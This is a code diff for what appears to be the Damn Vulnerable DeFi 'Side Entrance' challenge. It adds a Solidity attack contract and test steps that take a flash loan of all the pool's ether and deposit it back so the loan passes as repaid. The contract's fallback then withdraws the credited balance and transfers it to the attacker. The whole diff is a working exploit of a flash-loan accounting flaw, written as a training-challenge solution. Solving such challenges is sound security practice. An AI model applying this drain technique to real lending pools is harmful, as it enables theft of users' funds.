@@ -6,6 +6,31 @@ import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
 
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract attackContract is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+    address payable attacker;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+        attacker = payable(msg.sender);
+    }
+
+    function execute() external payable override {
+        pool.deposit{value: msg.value}();
+    }
+
+    fallback() external payable {
+        pool.withdraw();
+        console.log("Attacker balance before transfer: ", address(this).balance);
+        attacker.transfer(address(this).balance);
+    }
+    receive() external payable {}
+}
+
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
@@ -36,7 +61,13 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.prank(attacker);
+        attackContract attack = new attackContract(address(sideEntranceLenderPool));
+        vm.prank(address(attack));
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+        vm.prank(attacker);
+        (bool success,) = address(attack).call(abi.encodeWithSignature("A()"));
+        require(success, "Fallback call failed");
         /**
          * EXPLOIT END *
          */
